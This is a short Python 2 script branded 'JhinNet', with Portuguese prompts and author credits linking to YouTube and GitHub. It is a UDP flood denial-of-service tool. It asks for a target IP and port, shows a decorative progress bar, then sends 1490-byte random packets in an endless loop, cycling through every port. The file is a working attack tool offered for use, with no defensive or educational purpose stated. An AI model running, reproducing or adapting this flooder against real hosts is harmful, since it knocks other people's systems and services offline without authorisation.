import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet JhinNet")
print
print "Criado Por   : JhinStroke"
print "YouTube : https://www.youtube.com/channel/UCZP4kZ7K9FIbFUzYZvSne_A"
print "GitHub   : https://github.com/CHK-source"
print
ip = raw_input("IP : ")
port = input("Porta       : ")

os.system("clear")
os.system("figlet JhinNetAttack")
print "[                    ] 0%"
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviando %s Bots %s Para a Porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

